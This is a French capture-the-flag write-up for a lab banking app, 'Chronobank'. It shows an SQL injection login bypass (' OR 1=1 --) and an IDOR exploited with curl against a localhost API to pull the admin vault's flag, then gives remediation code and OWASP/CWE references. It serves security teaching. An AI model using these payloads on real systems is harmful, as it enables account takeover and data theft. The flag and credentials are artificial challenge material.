# Write-Up - Chronobank (SQLi + IDOR)

## Reconnaissance

On accède à l'app et on tombe sur une page de login bancaire futuriste "Chronobank". L'énoncé fournit un compte de test :

- **Username:** `traveler42`
- **Password:** `backto1985`

On se connecte et on explore l'app. On a accès à :
- `/dashboard` — liste de nos comptes bancaires
- `/account/{id}` — détail d'un compte avec transactions
- `/vault` — coffre-fort personnel (vide pour `traveler42`)

---

## Étape 1 : SQL Injection — Bypass du login

### Découverte

En testant une apostrophe dans le champ username (`test'`), on obtient une erreur SQL :

```
Database error: unrecognized token: "..."
```

Cela confirme une **SQL Injection** sur le endpoint login.

### Exploitation

La requête côté serveur est :
```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{hash}'
```

Pour bypasser l'authentification et se connecter en tant qu'admin (le premier utilisateur en BDD), on utilise :

**Username:**
```
' OR 1=1 --
```

**Password:** (n'importe quoi)
```
anything
```

La requête résultante devient :
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

`OR 1=1` est toujours vrai, et `--` commente le reste. Le `SELECT` retourne le premier utilisateur de la table, qui est **admin** (Dr. Chronos).

On est maintenant connecté en tant qu'admin ! On voit le dashboard avec les comptes admin et le badge `admin` dans la nav.

---

## Étape 2 : Explorer en tant qu'admin

Le dashboard admin montre deux comptes :
- Temporal Vault Prime (9,999,999.99 TC)
- Secret Operations Fund (1,337,000.00 TC)

En allant sur `/vault`, on voit deux secrets :
1. **Temporal Access Code** → `HIT{1d0r_4nd_sql1_t1m3_h31st}`
2. **Emergency Override** → `OVERRIDE-7742-ALPHA`

**Le flag est trouvé via la SQLi seule !**

---

## Chemin alternatif : IDOR (sans la SQLi admin)

Si un joueur ne parvient pas à se connecter en admin mais se connecte avec le compte `traveler42`, il peut quand même obtenir le flag via l'IDOR :

### Découverte

En visitant `/vault` en tant que `traveler42`, la page est vide mais le code source HTML contient un indice :

```html
<!-- TODO: Restrict /api/vault/{user_id} endpoint — currently any authenticated user can query any user_id -->
<!-- Admin vault (user_id=1) contains sensitive temporal access codes -->
```

De plus, le texte affiché donne un hint : *"The system API is at `/api/vault/<user_id>`"*

### Exploitation

On appelle directement l'API en changeant le `user_id` :

```bash
# Notre vault (user_id=4 pour traveler42) — vide
curl http://localhost:8001/api/vault/4 -b "session=<notre_cookie>"
# → {"user_id": 4, "entries": []}

# Vault admin (user_id=1)
curl http://localhost:8001/api/vault/1 -b "session=<notre_cookie>"
# → {"user_id": 1, "entries": [
#     {"id": 1, "secret_name": "Temporal Access Code", "secret_value": "HIT{1d0r_4nd_sql1_t1m3_h31st}"},
#     {"id": 2, "secret_name": "Emergency Override", "secret_value": "OVERRIDE-7742-ALPHA"}
#   ]}
```

On peut aussi explorer les comptes des autres via l'IDOR sur `/account/{id}` :
```
/account/1 → Admin Temporal Vault Prime
/account/2 → Admin Secret Operations Fund
/account/3 → jdoe Savings Account
...
```

---

## Flag

```
HIT{1d0r_4nd_sql1_t1m3_h31st}
```

---

## Solution résumée

### Chemin 1 : SQLi → Vault admin (le plus direct)
```
1. Login avec username: ' OR 1=1 --   password: x
2. Aller sur /vault
3. Flag visible directement
```

### Chemin 2 : Login test → IDOR sur l'API
```
1. Login avec traveler42 / backto1985
2. Inspecter le code source de /vault
3. GET /api/vault/1
4. Flag dans la réponse JSON
```

---

## Remédiation

### SQL Injection

Utiliser des **requêtes paramétrées** :
```python
# Vulnérable
query = f"SELECT * FROM users WHERE username = '{username}'"

# Sécurisé
query = "SELECT * FROM users WHERE username = ? AND password = ?"
conn.execute(query, (username, hashed))
```

### IDOR

Vérifier que la ressource demandée **appartient à l'utilisateur connecté** :
```python
# Vulnérable
entries = conn.execute("SELECT * FROM vault WHERE user_id = ?", (user_id,))

# Sécurisé
entries = conn.execute(
    "SELECT * FROM vault WHERE user_id = ?",
    (session["user_id"],)  # Force l'ID du user connecté
)
```

---

## Références

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
